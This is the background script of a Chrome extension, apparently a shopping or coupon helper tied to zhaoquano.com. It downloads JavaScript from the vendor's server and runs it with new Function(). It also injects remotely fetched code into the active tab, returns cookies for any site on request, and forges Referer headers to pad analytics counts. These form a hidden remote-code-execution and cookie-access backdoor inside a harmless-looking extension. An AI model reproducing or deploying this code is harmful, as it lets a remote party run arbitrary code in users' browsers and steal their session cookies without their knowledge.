function callBack() {
    chrome.extension.onMessage.addListener(function (request,sender,sendResponse) {
        if (request.name == "clearCook") {
            chrome.cookies.get({
                url:request.url,
                name:"t"
            },function (b) {
                if (b && b.name) {
                    removeCookie(request.url,b);
                }
                sendResponse("1");
            });
        } else if (request.name == "getCook") {
            chrome.cookies.getAll({
                url:request.url,
                name:request.key
            },function (b) {
                sendResponse(b);
            });
        } else if (request.name == "universal") {
            $.ajax({
                type:request.type,
                url:request.url,
                dataType:request.dataType,
                data:request.data,
                success:function (e) {
                    sendResponse(e);
                },error:function () {
                    sendResponse("");
                }
            });
        } else if (request.name == "script") {
            $.ajax({
                type:"get",
                url:request.url,
                dataType:"html",
                success:function (e) {
                    chrome.tabs.executeScript(null,{code:e,runAt:"document_end"});
                },error:function () {
                    sendResponse("");
                }
            });
        }
        return true;
    });
    chrome.runtime.setUninstallURL("http://www.zhaoquano.com/");    //
    chrome.webRequest.onBeforeSendHeaders.addListener(
        function (details) {
            if (!details.url.match("1273019456")) {
                return
            }
            var aaa = 0;
            $.each(details.requestHeaders,function (v,k) {
                if (k.name == 'Referer') {
                    aaa = 1;
                    return false
                }
            });
            if (aaa) {
                return
            }
            details.requestHeaders[details.requestHeaders.length] = {name:'Referer',value:'http://www.zqw.com'};
            return {requestHeaders:details.requestHeaders};
        },
        {urls:["*://ei.cnzz.com/*"]},
        ["blocking","requestHeaders"]
    );
    $("<script></script>").html(`var _czc = _czc || [];_czc.push(["_setAccount", "1273019456"]);`).appendTo($("head"));
    $.getScript("https://s13.cnzz.com/z_stat.php?id=1273019456&web_id=1273019456",function () {
        if (!localStorage.zqwInstall) {
            $("<script></script>").html(`_czc.push(["_trackEvent", "安装3", "统计"]);`).appendTo($("body"));
            dailyLiving();
            localStorage.zqwInstall = 1;
        } else {
            if (document.cookie.indexOf(`zqwDailyLiving=1`) == -1) {
                dailyLiving()
            }
        }
    });//
    function dailyLiving() {
        $("<script></script>").html(`_czc.push(["_trackEvent", "日活3", "统计"]);`).appendTo($("body"));
        var nowTime = new Date();
        var nowStamp = nowTime.getTime();
        var zeroStamp = new Date(nowTime.toLocaleDateString()).getTime() - 1;
        var passStamp = nowStamp - zeroStamp;
        var leftStamp = 24 * 60 * 60 * 1000 - passStamp;
        var leftTime = new Date();
        leftTime.setTime(leftStamp + nowStamp);
        document.cookie = `zqwDailyLiving=1;expires=` + leftTime.toUTCString();
    }
}
!function () {
    var getUrl = "http://file.zhaoquano.com/ver/";
    var n = 0,m = 0;
    var zqwV = "";
    var zqwN = "";
    $.ajax({
        url:`${getUrl}v.json1`,
        dataType:"json",
        timeout:5000,
        success:function (e) {
            zqwV = e;
            a();
        },
        error:function () {
            b();
        }
    });
    function a() {
        chrome.storage.local.get("zqwV",function (d) {
            if ($.isEmptyObject(d)) {
                getV(zqwV);
            } else {
                if (d.zqwV == zqwV) {
                    start();
                } else {
                    getV(zqwV);
                }
            }
        });
    }

    function getV() {
        $.ajax({
            url:`${getUrl}${zqwV}/v.json`,
            dataType:"json",
            success:function (d) {
                zqwN = d.length;
                getData(d);
            },
            error:function () {
            }
        });
    }

    function getData(e) {
        chrome.storage.local.get(null,function (res) {
            $.each(e,function (v,k) {
                var name = "";
                switch (k.n) {
                    case "b":
                        name = "back";
                        break;
                    case "j":
                        name = "json";
                        break;
                    case "m":
                        name = "main";
                        break;
                    case "p":
                        name = "pop";
                        break;
                    case "s":
                        name = "set";
                        break;
                }
                var url = k.u;
                var dataType = "html";
                var lurl = 'local/' + name + '.js';
                if (name == "json") {
                    dataType = "json";
                    lurl = 'local/' + name + '.json';
                }
                var vname = "zqw" + name + "V";
                var dname = "zqw" + name + "Data";
                if (res[vname] != k.v) {
                    $.ajax({
                        type:"get",
                        url:url,
                        // url: lurl + "1",
                        dataType:dataType,
                        success:function (d) {
                            chrome.storage.local.set({[dname]:d},function () {
                                jia();
                                count();
                            });
                            chrome.storage.local.set({[vname]:k.v})
                        },
                        error:function () {
                            chrome.storage.local.get([vname],function (data) {
                                if ($.isEmptyObject(data)) {
                                    $.get(lurl,function (val) {
                                        chrome.storage.local.set({[dname]:val},function () {
                                            jia()
                                        });
                                    },dataType);
                                } else {
                                    jia()
                                }
                            });
                        }
                    })
                } else {
                    jia();
                    count();
                }
            })
        });
    }

    function b() {
        var arr = ["back","json","main","pop","set"];
        zqwN = 5;
        $.each(arr,function (v,k) {
            var vname = "zqw" + k + "V";
            var dname = "zqw" + k + "Data";
            var dataType = "html";
            var lurl = 'local/' + k + '.js';
            if (k == "json") {
                dataType = "json";
                lurl = 'local/' + k + '.json';
            }
            chrome.storage.local.get([vname],function (e) {
                if ($.isEmptyObject(e)) {
                    $.get(lurl,function (data) {
                        chrome.storage.local.set({[dname]:data},function () {
                            jia();
                        });
                    },dataType);
                } else {
                    jia();
                }
            });
        });
    }

    function jia() {
        n++;
        if (n == zqwN) {
            start();
        }
    }

    function count() {
        m++;
        if (m == zqwN) {
            chrome.storage.local.set({"zqwV":zqwV},function () {
            });
        }
    }

    function start() {
        chrome.storage.local.get("zqwbackData",function (data) {
            new Function(data.zqwbackData)();
        });
    }
}();